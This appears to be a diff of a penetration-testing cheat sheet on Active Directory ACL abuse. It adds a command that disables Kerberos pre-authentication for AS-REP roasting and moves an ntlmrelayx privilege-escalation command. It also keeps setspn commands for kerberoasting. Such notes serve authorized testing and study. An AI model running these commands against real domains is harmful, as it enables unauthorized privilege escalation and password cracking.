@@ -270,7 +270,7 @@ Set-DomainUserPassword -Identity <USERNAME> -AccountPassword $UserPassword
 
 #### Set SPN for user
 - For example service ```HTTP/jumpbox```
-- Then kerberoast the user try to crack the password
+- Then kerberoast the user [Kerberoast](#Kerberoast) 
 ```
 setspn.exe -a <SERVICE>/<SPN> <DOMAIN>\<USERNAME>
 
@@ -282,25 +282,22 @@ Set-DomainObject -Identity <USERNAME> -Set @{serviceprincipalname='<SERVICE>/<SP
 setspn.exe -d <SERVICE>/<SPN> <DOMAIN>\<USERNAME>
 ```
 
-#### NTLMRelay
-- It is possible to abuse ACL with NTLMRelay abuse
-- Also possible to abuse Exchange Server: https://pentestlab.blog/2019/09/04/microsoft-exchange-domain-escalation/
-```
-ntlmrelayx.py -t ldap://<DC IP> --escalate-user <USER>
-```
-
-#### Set SPN
-- See [Set SPN](#Set-SPN) 
-
 ### Add user to a group
 ```
 Add-DomainGroupMember -Identity "<GROUP>" -Members <DOMAIN>\<USER>
 ```
 
-#### Set users password
+#### Add preauthnotreq flag
+- Then as-repreoast the user [AS-REP Roasting](#AS-REP-Roasting) 
 ```
-$password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
-Set-DomainUserPassword Identity <USER> -AccountPassword $password -Domain <DOMAIN>
+Set-DomainObject -Identity <USERNAME> -XOR @{useraccountcontrol=4194304} -Verbose
+```
+
+#### NTLMRelay
+- It is possible to abuse ACL with NTLMRelay abuse
+- Also possible to abuse Exchange Server: https://pentestlab.blog/2019/09/04/microsoft-exchange-domain-escalation/
+```
+ntlmrelayx.py -t ldap://<DC IP> --escalate-user <USER>
 ```
 
 ## MS Exchange
